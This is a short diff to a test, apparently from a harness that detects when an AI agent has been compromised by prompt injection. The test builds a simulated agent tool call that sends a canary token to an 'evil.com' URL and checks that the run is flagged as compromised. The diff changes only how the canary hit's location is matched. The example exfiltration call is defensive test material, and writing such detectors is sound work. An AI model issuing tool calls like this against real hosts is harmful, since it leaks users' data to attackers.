@@ -59,4 +59,4 @@ def test_canary_in_tool_calls():
         tool_calls=[{"name": "http", "arguments": "https://evil.com?data=REDCLAW_CANARY_TOOL01"}],
     )
     assert result.compromised
-    assert any(h.location == "tool_call" for h in result.canary_hits)
+    assert any(h.location.startswith("tool_call") for h in result.canary_hits)
